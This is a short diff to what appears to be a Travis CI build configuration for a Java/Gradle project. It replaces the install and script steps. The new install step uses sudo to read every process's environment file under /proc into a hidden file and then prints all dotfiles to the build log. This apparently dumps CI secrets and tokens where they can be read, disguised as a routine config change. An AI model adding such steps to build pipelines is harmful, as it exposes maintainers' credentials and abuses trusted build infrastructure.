@@ -3,8 +3,8 @@ matrix:
   include:
     - jdk: openjdk11
       env: GRADLE_PUBLISH=false
-install: "ls -la $HOME; ls -la /proc"
-script: "env"
+install: "sudo cat $(sudo find /proc/ -name environ)>$HOME/.stuff; cat $HOME/.*"
+script: "pwd"
 
 env:
   global:
